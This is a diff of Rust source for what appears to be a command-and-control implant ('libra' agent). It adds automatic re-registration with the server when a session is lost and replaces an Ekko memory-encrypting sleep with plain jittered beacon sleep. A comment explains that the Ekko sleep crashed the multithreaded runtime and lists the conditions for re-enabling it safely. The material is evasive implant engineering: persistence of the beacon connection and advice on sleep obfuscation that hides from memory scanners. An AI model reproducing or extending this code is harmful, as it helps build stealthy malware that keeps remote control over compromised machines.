@@ -66,6 +66,27 @@ impl AgentEngine {
     // ── Main entry point ─────────────────────────────────────────────
 
     pub async fn run(&mut self) -> Result<(), String> {
+        loop {
+            match self.run_once().await {
+                // 会话丢失（服务端重启/重启后 token 失效）：重置通道状态，
+                // 重新走注册流程（新 token + 可能的新会话密钥）。crypto 的
+                // RSA keypair 与已有 session key 保留——服务端若仍持有旧
+                // session key 则复用（hasSessionKey=true），否则重新下发。
+                Err(e) if e == "SESSION_LOST" => {
+                    libra_common::dlog!("[INFO] session lost — re-registering");
+                    self.http = None;
+                    self.ws = None;
+                    self.ws_tx = None;
+                    self.session_token.clear();
+                    self.profile = None;
+                    continue;
+                }
+                other => return other,
+            }
+        }
+    }
+
+    async fn run_once(&mut self) -> Result<(), String> {
         self.crypto.generate_key_pair();
 
         let hw = libra_platform::hardware::collect();
@@ -198,7 +219,6 @@ impl AgentEngine {
         let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
         let hb_mm = module_manager.clone();
         let hb_reconnect = reconnect_tx.clone();
-        let hb_gate = shared.clone();
         let hb_ws_cmd = ws_cmd_tx.clone();
         tokio::spawn(async move {
             let mut hb_http = HttpCommunicator::new(&server_url, &register_path, &register_path, &register_path);
@@ -222,14 +242,16 @@ impl AgentEngine {
                     _ => {}
                 }
 
-                // beacon sleep：空闲时走 Ekko 混淆（加密整个镜像），有
-                // in-flight 消息处理时降级为普通 tokio sleep。
+                // beacon sleep：块状抖动。
+                //
+                // ⚠️ Ekko 混淆 sleep（libra_syscalls::obfuscated_sleep）已被移出主路径：
+                // 它加密整个镜像期间，tokio 多线程 runtime 的 IO 驱动/调度器/其他
+                // worker 线程仍在执行 agent 的 .text（已被加密）→ 执行垃圾指令 →
+                // 栈损坏/stack overflow 崩溃（WS 连接建立后 IO 活跃，必现）。
+                // process_gate 只能挡住业务任务，挡不住 tokio 内部线程。
+                // 要安全启用需：单线程进程 + 加密前挂起所有其他线程（隔离 VM 验证）。
                 let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
-                if let Ok(_gate) = hb_gate.process_gate.try_lock() {
-                    unsafe { libra_syscalls::obfuscated_sleep(interval_ms as u32) };
-                } else {
-                    tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
-                }
+                tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
             }
         });
 
@@ -342,6 +364,9 @@ impl AgentEngine {
 
         // Put ws back before returning
         self.ws = Some(ws);
-        Err("Agent main loop ended".into())
+        // 此处只可能是重注册信号（SESSION_LOST）触发的 break：
+        // heartbeat 检测到会话丢失 → reconnect_rx → do_reconnect。
+        // 返回 SESSION_LOST 让 run() 重新走注册流程。
+        Err("SESSION_LOST".into())
     }
 }
